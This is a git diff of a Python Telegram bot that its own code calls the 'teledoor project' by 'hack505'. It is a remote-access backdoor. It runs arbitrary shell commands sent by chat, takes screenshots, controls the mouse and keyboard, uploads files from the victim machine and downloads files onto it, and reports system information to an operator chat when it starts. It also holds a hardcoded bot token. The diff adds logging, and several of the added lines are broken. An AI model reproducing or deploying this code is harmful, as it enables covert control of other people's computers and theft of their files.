@@ -5,11 +5,17 @@ import subprocess
 import pyautogui
 import datetime
 import platform
-# import random
 import socket
 import os
 import json
-from colorama import init, Fore
+import logging
+
+# Set up logging
+file_name = "app.log"
+logging.basicConfig(filename=file_name, level=logging.DEBUG,
+                    format='%(asctime)s - %(levelname)s - %(message)s')
+
+logging.info('-'*500)
 
 try:
     with open("config.json", 'r') as config_file:
@@ -18,17 +24,12 @@ try:
         TOKEN = config.get("token")
         chat_id = config.get("chat_id")
         debug = config.get("debug")
-        print("all info imported form json file")
+        logging.debug("All information have been imported from json file")
 
 except Exception as e:
-    print("can't able to import information from the json file!")
+    logging.warning(e)
 
     TOKEN = "6845961407:AAGbKJc7LSpkokCVw-jJg9ByyaLoO3oBT_Q"  # @hack505Mark1bot
-
-
-def debug_print(message):
-    if debug:
-        debug_print(f"{Fore.YELLOW} ")
 
 
 def cd(update, context):
@@ -36,8 +37,10 @@ def cd(update, context):
         to_change_dir = update.message.text[len('/cd '):]
         os.chdir(to_change_dir)
         update.message.reply_text(f"Command executed successfully:")
+        logging.debug(f"dir has been changed to {os.pwd()}")
     except Exception as E:
         update.message.reply_text(E)
+        logging.error(e)
 
 
 def ls(update, context):
@@ -45,8 +48,10 @@ def ls(update, context):
         list_dir = update.message.text[len("/ls "):]
         os.listdir(list_dir)
         update.message.reply_text(f"Command executed successfully:")
+        logging.debug("dir has been listed")
     except Exception as E:
         update.message.reply_text(E)
+        logging.error(E)
 
 
 def system_info(context):
@@ -65,23 +70,16 @@ def system_info(context):
             f"System: {system}\n"
             f"Machine: {machine}")
 
-        try:
-            # update.message.reply_text(info_string)
-            sys_info_send = True
-        except:
-            pass
-
         # Replace 'YOUR_CHAT_ID' with the actual chat ID where you want to send the message
         context.bot.send_message(
-            chat_id="5118057698", text=info_string)
+            chat_id=chat_id, text=info_string)
     except Exception as e:
-        # update.message.reply_text(f"Error: {e}")
-        # debug_print(e)
-        pass
+        logging.error(e)
 
 
 def yo(update, context):
     update.message.reply_text("I am still Alive!")
+    logging.debug("yo to user")
 
 
 def take_screenshot():
@@ -92,10 +90,13 @@ def take_screenshot():
     screenshot.save(f"{current_time}.png")
     return f"{current_time}.png"
 
+    logging.debug(f"screenshot has been sent namely: {current_time}")
+
 
 def start(update, context):
     update.message.reply_text(
         "Hello! Welcoming you to Hack505 offical's . It's Mark I")
+    logging.debug("A user has Started the bot")
 
 
 def help(update, context):
@@ -114,11 +115,13 @@ def help(update, context):
     $mouse    --> Get the mouse cooradanates
     $type     --> Type anything you want!
                               """)
+    logging.debug("i have helped a user")
 
 
 def content(update, context):
     update.message.reply_text(
         "this project is owned by hack505 . check out there github page- www.github.com/hack505")
+    logging.debug("a user now our content")
 
 
 def screenshot(update, context):
@@ -127,11 +130,13 @@ def screenshot(update, context):
         update.message.reply_photo(photo=open(image_path, 'rb'))
     except Exception as e:
         update.message.reply_text(f"Error: {e}")
+        logging.error(e)
 
 
 def admin(update, context):
     update.message.reply_text(
         "this bot is a part of teledoor project made by hack505 offical ")
+    logging.debug("i am the admin")
 
 
 def handle_text(update, context):
@@ -140,6 +145,7 @@ def handle_text(update, context):
 
         if user_text == "$mouse":
             update.message.reply_text(str(pyautogui.position()))
+            logging.debug(f"mouse corridates: {pyautogui.position()}")
 
         # Check if the message starts with the /type command
         elif user_text.startswith('$type'):
@@ -147,12 +153,15 @@ def handle_text(update, context):
             text_to_type = user_text[len('$type'):].strip()
             if text_to_type:
                 pyautogui.write(text_to_type)
+                logging.debug(f"typed: {text_to_type}")
             else:
                 update.message.reply_text(
                     "Please provide text after the /type command.")
+                logging.debug("can type or not text is provied")
 
     except Exception as e:
         update.message.reply_text(f"Error: {e}")
+        logging.error(e)
 
 
 def run_command(update, context):
@@ -163,38 +172,46 @@ def run_command(update, context):
         # Execute the command using subprocess
         result = subprocess.check_output(command, shell=True, text=True)
         update.message.reply_text(f"Command executed successfully:\n{result}")
+        logging.debug(f"command: {command}")
     except subprocess.CalledProcessError as e:
         update.message.reply_text(f"Error executing command:\n{e}")
+        logging.error(f"Error executing command:\n{e}")
 
 
 def download_file(update, context):
-    # Get the file ID from the message
-    file_id = update.message.document.file_id
+    try:
+        # Get the file ID from the message
+        file_id = update.message.document.file_id
 
-    # Get information about the file
-    file_info = context.bot.get_file(file_id)
+        # Get information about the file
+        file_info = context.bot.get_file(file_id)
+        file_name = context.bot.get_file(file_name)
 
-    # Download the file
-    file_path = file_info.download()
+        # Download the file
+        file_path = file_info.download(file_name=file_name)
 
-    update.message.reply_text(
-        f"File downloaded successfully. Path: {file_path}")
+        update.message.reply_text(
+            f"File downloaded successfully. Path: {file_path} file name: {file_name}")
+        logging.debug()
+
+    except Exception as e:
+        logging.error(e)
 
 
 def press_key(update, context):
-    # debug_print("Press key to continue")
     try:
         # Extract the keyour_context_variabley combination after the /presskey command
         key_combination = update.message.text[len('/press '):]
         if key_combination:
             key_combination = key_combination.split()
-            debug_print(key_combination)
             pyautogui.hotkey(*key_combination)
+            logging.debug(f"key to press: {key_combination}")
         else:
             update.message.reply_text(
                 "Please provide a key combination after the /press command.")
     except Exception as e:
         update.message.reply_text(f"Error: {e}")
+        logging.error(e)
 
 
 def arrow_key(update, context):
@@ -215,8 +232,10 @@ def arrow_key(update, context):
             pyautogui.hotkey(arrow_keys[arrow_command])
         else:
             update.message.reply_text("Invalid arrow key command.")
+            logging.debug("Invalid arrow key command.")
     except Exception as e:
         update.message.reply_text(f"Error: {e}")
+        logging.error(e)
 
 
 def download_requested_file(update: Update, context: CallbackContext) -> None:
@@ -230,18 +249,18 @@ def download_requested_file(update: Update, context: CallbackContext) -> None:
         if os.path.exists(file_path):
             # Send the requested file to the user who sent the command
             update.message.reply_document(document=open(file_path, 'rb'))
+            logging.debug(
+                f"file as been sent namely: {file_name}, in path: {file_path}")
         else:
             update.message.reply_text(f"File '{file_name}' not found.")
+            logging.debug(f"File '{file_name}' not found.")
     except Exception as e:
         update.message.reply_text(f"Error: {e}")
-
-
-updater = telegram.ext.Updater(TOKEN, use_context=True)
+        logging.error(f"Error: {e}")
 
 
 def edit_message(update, context):
     try:
-        debug_print("i have reached here to edit")
         new_message_text = "This message has been edited."
         chat_id = update.message.chat_id
 
@@ -257,6 +276,8 @@ def edit_message(update, context):
 
     except Exception as e:
         update.message.reply_text(f"Error: {e}")
+
+# Main logic and handlers
 
 
 updater = telegram.ext.Updater(TOKEN, use_context=True)
@@ -283,10 +304,7 @@ disp.add_handler(CommandHandler("download", download_requested_file))
 disp.add_handler(CommandHandler("cd", cd))
 disp.add_handler(CommandHandler("ls", ls))
 
-# updater.job_queue.run_once(system_info, 0, context=updater)
-# updater.job_queue.run_once(lambda context: system_info(None, context), 0)
 updater.job_queue.run_once(system_info, 0)
 
 updater.start_polling()
 updater.idle()
-# I am using vim it's cool!
